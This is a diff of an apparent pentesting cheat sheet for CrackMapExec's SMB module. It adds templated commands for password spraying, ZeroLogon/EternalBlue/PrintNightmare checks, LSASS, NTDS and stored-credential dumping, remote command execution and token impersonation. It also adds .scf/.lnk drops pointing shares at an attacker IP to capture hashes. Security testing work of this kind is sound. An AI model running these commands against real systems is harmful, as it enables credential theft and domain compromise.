@@ -12,6 +12,24 @@ Enumerate network hosts that can be reached via SMB.
 cme smb <ip>
 ```
 
+## Enumerate ADCS CA
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous
+
+Enumerate RPC endpoints to find ADCS CAs.
+
+```bash
+cme smb <ip> -M enum_ca
+```
+
+## Enumerate password policy
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user
+
+Enumerate the domain password policy.
+
+```bash
+cme smb <dc-ip> -u <user> -p <password> --pass-pol
+```
+
 ## Enumerate domain users anonymously
 #assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous
 
@@ -19,6 +37,15 @@ Enumerate domain users through a null session.
 
 ```bash
 cme smb <dc-ip> -u '' -p '' --users
+```
+
+## Enumerate domain users by RID bruteforce
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Enumerate domain users by bruteforcing the RID.
+
+```bash
+cme smb <ip> -u <user> -p <password> --rid-brute
 ```
 
 ## Enumerate domain users
@@ -39,15 +66,6 @@ Enumerate domain computers.
 cme smb <dc-ip> -u <user> -p <password> --computers
 ```
 
-## Enumerate password policy
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user
-
-Enumerate the domain password policy.
-
-```bash
-cme smb <dc-ip> -u <user> -p <password> --pass-pol
-```
-
 ## Enumerate null session
 #assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Anonymous
 
@@ -66,49 +84,6 @@ Check if the remote target accepts authentication via a Guest session.
 cme smb <ip> -u 'a' -p ''
 ```
 
-## Enumerate active SMB sessions
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
-
-Enumerate active SMB sessions (including RPC/DCOM over named pipes) on the remote target.
-
-⚠️ Requirement : Most often requires admin privileges (use --local-auth if the user is a local account)
-
-```bash
-cme smb <ip> -u <user> -p <password> --smb-sessions
-```
-
-## Enumerate users by bruteforce the RID
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
-
-```bash
-cme smb <ip> -u <user> -p <password> --rid-brute
-```
-
-## Enumerate local groups
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
-
-```bash
-cme smb <ip> -u <user> -p <password> --local-groups
-```
-
-## Enumerate shares
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
-
-Enumerate permissions on all shares. Filter by readable or writable.
-
-```bash
-cme smb <ip> -u <user> -p <password> -d <domain> --shares --filter-shares READ WRITE
-```
-
-## Enumerate disks
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
-
-Enumerate disks on the remote target
-
-```bash
-cme smb <ip> -u <user> -p <password> --disks
-```
-
 ## Enumerate SMB target not signed
 #assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user
 
@@ -121,26 +96,48 @@ cme smb <ip> --gen-relay-list smb_not_signed.list
 ## Enumerate logged-on users
 #assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
 
+Enumerate logged users on the remote target.
+
 ```bash
 cme smb <ip> -u <user> -p <password> --loggedon-users
 ```
 
-## Enumerate AV & EDR
+## Enumerate active SMB sessions
 #assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
 
+Enumerate active SMB sessions (including RPC/DCOM over named pipes) on the remote target.
+
+⚠️ Requirement : Most often requires admin privileges (use --local-auth if the user is a local account)
+
 ```bash
-cme smb <ip> -u <user> -p <password> -M enum_av
+cme smb <ip> -u <user> -p <password> --smb-sessions
 ```
 
-## Enumerate BitLocker
-#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin 
+## Enumerate local groups
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
 
-Enumerate BitLocker status on the remote target.
-
-⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+Enumerate local groups on the remote target.
 
 ```bash
-cme smb <ip> -u <user> -p <password> -M bitlocker
+cme smb <ip> -u <user> -p <password> --local-groups
+```
+
+## Enumerate shares
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Enumerate permissions on all shares. Filter by readable or writable.
+
+```bash
+cme smb <ip> -u <user> -p <password> --shares --filter-shares READ WRITE
+```
+
+## Enumerate disks
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Enumerate disks on the remote target.
+
+```bash
+cme smb <ip> -u <user> -p <password> --disks
 ```
 
 ## Enumerate WebDav
@@ -161,10 +158,52 @@ Enumerate if the Spooler service is running on the remote target.
 cme smb <ip> -u <user> -p <password> -M spooler
 ```
 
+## Enumerate AV & EDR
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Enumerate Anti-virus and EDR services runnign on the remote target.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M enum_av
+```
+
+## Enumerate UAC status
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Enumerate UAC status on the remote target.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M uac
+```
+
+## Enumerate BitLocker
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin 
+
+Enumerate BitLocker status on the remote target.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M bitlocker
+```
+
+## Enumerate DNS entries
+#assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin 
+
+Enumerate ADIDNS entries.
+
+⚠️ Requirement : Domain admin privileges.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M enum_dns
+```
+
 ## Enumerate network interfaces
 #assessment/AD #attack_type/Enumeration #port/445 #port/139 #protocol/smb #access/Admin
 
-Enumerate network interfaces on a host.
+Enumerate network interfaces on the remote target.
 
 ⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
 
@@ -172,10 +211,173 @@ Enumerate network interfaces on a host.
 cme smb <ip> -u <user> -p <password> --interfaces
 ```
 
+## Password spray (user=password)
+#assessment/AD #attack_type/Bruteforce #port/445 #port/139 #protocol/smb #access/Anonymous
+
+Password spray to find domain accounts with user=password.
+
+```bash
+cme smb <dc-ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
+```
+
+## Password spray multiple test 
+#assessment/AD #attack_type/Bruteforce #port/445 #protocol/smb #access/Anonymous
+
+Password spray to find domain accounts with weak passwords.
+
+(careful on lockout)
+
+```bash
+cme smb <dc-ip> -u <users.list> -p <password.txt> --continue-on-success
+```
+
+## NoPac
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Check if the Domain Controller is vulnerable to noPac.
+
+```bash
+cme smb <dc-ip> -u <user> -p <password> -M nopac
+```
+
+## ZeroLogon
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Anonymous 
+
+Check if the Domain Controller is vulnerable to ZeroLogon.
+
+```bash
+cme smb <dc-ip> -M zerologon
+```
+
+## PrintNightmare
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Check if the targeted host is vulnerable to PrintNightmare.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M printnightmare
+```
+
+## DropTheMic
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Check if the targeted host is vulnerable to DropTheMic.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M remove-mic
+```
+
+## MS17-010 (EternalBlue)
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Anonymous 
+
+Check if the targeted host is vulnerable to MS17-010 (EternalBlue).
+
+```bash
+cme smb <ip> -M ms17-010
+```
+
+## SMBGhost
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Anonymous 
+
+Check if the targeted host is vulnerable to SMBGhost.
+
+```bash
+cme smb <ip> -M smbghost
+```
+
+## BadSuccessor
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Anonymous 
+
+Check if a domain user can create a dMSA account or controls an OU where it can be created.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M badsuccessor
+```
+
+## Coerce
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Check for coerce vulnerabilities such as PetitPotam, DFSCoerce, PrinterBug, MSEven and ShadowCoerce.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M coerce_plus
+```
+
+## GPP Autologin
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Searches the Domain Controller for registry.xml to find autologon information and returns the username and password.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M gpp_autologin
+```
+
+## GPP Password
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Domain_user 
+
+Retrieves plaintext passwords and other information for accounts pushed through Group Policy Preferences.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M gpp_password
+```
+
+## Impersonate
+#assessment/AD #attack_type/Quickwin #port/445 #port/139 #protocol/smb #access/Admin
+
+List and impersonate windows tokens to run command as locally logged on users.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M impersonate
+```
+
+## Check NTLMv1
+#assessment/AD #attack_type/Check #port/445 #port/139 #protocol/smb #access/Admin
+
+Check if ntlmv1 is enabled.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M ntlmv1
+```
+
+## Check AlwaysInstallElevated
+#assessment/AD #attack_type/Check #port/445 #port/139 #protocol/smb #access/Admin
+
+Check if AlwaysInstallElevated is enabled.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M install_elevated
+```
+
+## Check RunAsPPL
+#assessment/AD #attack_type/Check #port/445 #port/139 #protocol/smb #access/Admin
+
+Check if RunAsPPL is enabled.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M runasppl
+```
+
+## Domain auth
+#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
+
+Authenticate via a domain account on the remote target.
+
+```bash
+cme smb <ip> -u <user> -p <password> -d <domain>
+```
+
 ## Local-auth
 #assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
 
-Authenticate via a local account on the target.
+Authenticate via a local account on the remote target.
 
 ```bash
 cme smb <ip> -u <user> -p <password> --local-auth
@@ -184,19 +386,16 @@ cme smb <ip> -u <user> -p <password> --local-auth
 ## Local-auth with hash
 #assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
 
+Authenticate via a local account using the hash on the remote target.
+
 ```bash
 cme smb <ip> -u <user> -H <hash> --local-auth
 ```
 
-## Domain auth
-#assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
-
-```bash
-cme smb <ip> -u <user> -p <password> -d <domain>
-```
-
 ## Kerberos auth
 #assessment/AD #attack_type/Authentication #port/445 #port/139 #protocol/smb #access/Domain_user
+
+Authenticate via a Kerberos ticket on the remote target.
 
 Previously import ticket : 
 export KRB5CCNAME=/tmp/ticket.ccache
@@ -226,7 +425,6 @@ Execute S4U2Self and impersonate a user through msDS-AllowedToActOnBehalfOfOther
 ```bash
 cme smb <ip> -u <computer$> -H <hash> --delegate <impersonated_user>
 ```
-
 
 ## Dump SAM
 #assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
@@ -272,6 +470,39 @@ Dump secrets from the LSASS process memory using methods from LSASSY.
 cme smb <ip> -u <user> -p <password> -M lsassy
 ```
 
+## Dump LSASS (Nanodump)
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump secrets from the LSASS process memory using methods from Nanodump.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M nanodump
+```
+
+## Dump LSASS (Procdump)
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump secrets from the LSASS process memory using methods from Procdump.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M procdump
+```
+
+## Dump LSASS (Handlekatz)
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump secrets from the LSASS process memory using methods from Handlekatz64 and pypykatz.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M handlekatz
+```
+
 ## Dump LSASS - with bloodhound update
 #assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
 
@@ -295,12 +526,23 @@ cme smb <ip> -u <user> -p <password> -M security-questions
 ## Dump NTDS
 #assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin
 
-Dump the NTDS.dit from target DC using methods from secretsdump.py
+Dump the NTDS.dit using methods from secretsdump.py.
 
 ⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller
 
 ```bash
 cme smb <dc-ip> -u <user> -p <password> --ntds
+```
+
+## Dump NTDS (ntdsutil)
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin
+
+Dump the NTDS.dit using methods from ntdsutil.
+
+⚠️ Requirement : Domain Admin ou Local admin privileges on the Domain Controller
+
+```bash
+cme smb <dc-ip> -u <user> -p <password> -M ntdsutil
 ```
 
 ## Dump DPAPI
@@ -326,15 +568,68 @@ Won't collect system credentials. This will prevent EDR from stopping you from l
 cme smb <dc-ip> -u <user> -p <password> --dpapi nosystem
 ```
 
+## Dump Masky
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump domain user credentials via an ADCS and a KDC.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <dc-ip> -u <user> -p <password> -M masky -o CA=<domain>\<domain-host-CA>
+```
+
+## Dump PowerShell history
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Extract PowerShell history for all users and looks for sensitive commands.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <dc-ip> -u <user> -p <password> -M powershell_history
+```
+
+## Dump IIS
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump credentials in IIS Application Pool configuration files using appcmd.exe.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <dc-ip> -u <user> -p <password> -M iis
+```
+
+## Dump Autologon
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump autologon credentials stored in the registry.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <dc-ip> -u <user> -p <password> -M reg-winlogon
+```
+
 ## Dump CLPA logs
 #assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
 
-Dump clear-text credentials passed in command lines which are logged in Windows Event ID 4688 from the target host.
+Dump clear-text credentials passed in command lines which are logged in Windows Event ID 4688.
 
 ⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
 
 ```bash
 cme smb <dc-ip> -u <user> -p <password> -M eventlog_creds
+```
+
+## Dump NTP computer hashes (TimeRoast)
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump password hashes of any computer or trust account using Windows NTP authentication.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M timeroast
 ```
 
 ## Dump WIFI password
@@ -403,6 +698,17 @@ Dump mRemoteNG credentials.
 cme smb <ip> -u <user> -p <password> -M mremoteng
 ```
 
+## Dump MobaXterm
+#assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
+
+Dump MobaXterm credentials.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M mobaxterm
+```
+
 ## Dump Notepad
 #assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Admin
 
@@ -441,7 +747,7 @@ cme smb <ip> -u <user> -p <password> -M wam
 ## Dump SCCM
 #assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_Admin
 
-Dump the SCCM from the target host using methods from dploot
+Dump the SCCM using methods from dploot.
 
 ⚠️ Requirement : Domain admin or Local admin privileges on target Domain Controller
 
@@ -463,7 +769,7 @@ cme smb <ip> -u <user> -p <password> -M veeam
 ## Dump with BackupOperator priv
 #assessment/AD #attack_type/Dump #port/445 #port/139 #protocol/smb #access/Domain_user
 
-Dump SAM, SYSTEM, SECURITY (and the NTDS.dit on DC) on the target system.
+Dump SAM, SYSTEM, SECURITY (and the NTDS.dit on DC) on the remote target.
 
 ⚠️ Requirement : Controlled user has SeBackupPrivilege. No admin privs needed.
 
@@ -488,36 +794,6 @@ Can be useful after enable wdigest to force user to reconnect.
 ```bash
 cme smb <ip> -u <user> -p <password> -x 'quser'
 cme smb <ip> -u <user> -p <password> -x 'logoff <id_user>' --no-output
-```
-
-
-## Password spray (user=password)
-#assessment/AD #attack_type/Bruteforce #port/445 #port/139 #protocol/smb #access/Anonymous
-
-```bash
-cme smb <dc-ip> -u <users.list> -p <users.list> --no-bruteforce --continue-on-success
-```
-
-## Password spray multiple test 
-#assessment/AD #attack_type/Bruteforce #port/445 #protocol/smb #access/Anonymous
-
-(careful on lockout)
-
-```bash
-cme smb <dc-ip> -u <users.list> -p <password.txt> --continue-on-success
-```
-
-
-## Change a domain user password
-#assessment/AD #attack_type/Authentication #port/445 #protocol/smb #access/Domain_user
-
-Allows to change a domain user's password. Valuable if the actual password has expired and must be changed (authentication status : STATUS_PASSWORD_MUST_CHANGE).
-(Notify the client about changing a user's password)
-
-⚠️ Requirement : Knowledge of the targeted account's actual password.
-
-```bash
-cme smb <ip> -u <user> -p <password> -M change-password -o NEWPASS=<newpass>
 ```
 
 ## Execute remote commands (CMD)
@@ -556,7 +832,7 @@ cme smb <ip> -u <user> -p <password> -x <command> --exec-method <method>
 ## Execute remote commands through Scheduled Tasks
 #assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Admin
 
-Execute remote commands on behalf of another user with an active session on the targeted system, through Scheduled Tasks.
+Execute remote commands on behalf of another user with an active session on the remote target, through Scheduled Tasks.
 
 ⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
 
@@ -567,7 +843,7 @@ cme smb <ip> -u <user> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=
 ## Execute remote commands through Process Injection
 #assessment/AD #attack_type/Command_Execution #port/445 #protocol/smb #access/Admin
 
-Execute remote commands on behalf of another user with an active session on the targeted system, through Process Injection.
+Execute remote commands on behalf of another user with an active session on the remote target, through Process Injection.
 
 ⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
 
@@ -575,10 +851,89 @@ Execute remote commands on behalf of another user with an active session on the 
 cme smb <ip> -u <user> -p <password> -M pi -o PID=<target_process_pid> EXEC=<command>
 ```
 
+## Scuffy (.scf file in share)
+#assessment/AD #attack_type/Relay #port/445 #port/139 #protocol/smb #access/Admin
+
+Drop a .scf file in all writeable shares to trigger a SMB authentication (or at least a NTLMv2 hash disclosure).
+
+```bash
+cme smb <ip> -u <user> -p <password> -M scuffy -o NAME=.thumbs.db SERVER=<attacker_ip>
+```
+
+## Slinky (.lnk file in share)
+#assessment/AD #attack_type/Relay #port/445 #port/139 #protocol/smb #access/Admin
+
+Drop a .lnk file in all writeable shares to trigger a SMB authentication (or at least a NTLMv2 hash disclosure).
+
+```bash
+cme smb <ip> -u <user> -p <password> -M slinky -o NAME=.thumbs.db SERVER=<attacker_ip>
+```
+
+## Clean up Scuffy/Slinky
+#assessment/AD #attack_type/Relay #port/445 #port/139 #protocol/smb #access/Admin
+
+Clean up all .scf files dropped with scuffy in all writeable shares.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M <scuffy_or_slinky> -o NAME=.thumbs.db CLEANUP=true
+```
+
+## Add a domain computer
+#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+
+Allow to add a domain computer account.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M add-computer -o NAME=<name> PASSWORD=<machine_password>
+```
+
+## Delete a domain computer
+#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+
+Allow to delete a domain computer account.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M add-computer -o NAME=<name> DELETE=True
+```
+
+## Change a domain user password
+#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+
+Allow to change a domain user's password. Valuable if the actual password has expired and must be changed (authentication status : STATUS_PASSWORD_MUST_CHANGE).
+(Notify the client about changing a user's password)
+
+⚠️ Requirement : Knowledge of the targeted account's actual password.
+
+```bash
+cme smb <ip> -u <user> -p <password> -M change-password -o NEWPASS=<newpass>
+```
+
+## Download SnippingTool screenshots
+#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+
+Download screenshots taken by the (new) Snipping Tool on the remote target.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M snipped
+```
+
+## KeePass discover
+#assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
+
+Search for KeePass-related files and process on the remote target.
+
+⚠️ Requirement : Local admin privileges on the remote target (use --local-auth if the user is a local account)
+
+```bash
+cme smb <ip> -u <user> -p <password> -M keepass_discover
+```
+
 ## List files in shares
 #assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
 
-Spider shares files on a remote system. Search can be filter by file extension.
+Spider shares files on a remote target. Search can be filter by file extension.
 
 ```bash
 cme smb <ip> -u <user> -p <password> --spider <share> --pattern <file_extension>
@@ -595,7 +950,8 @@ cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Wind
 
 ## Get file
 #assessment/AD #attack_type/Other #port/445 #protocol/smb #access/Domain_user
-Send a local file to the remote target
+
+Get a local file grom the remote target.
 
 ```bash
 cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
@@ -608,3 +964,4 @@ cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\ta
 = domain: $DOMAIN
 = method: wmiexec
 = share: C\$
+= scuffy_or_slinky: scuffy
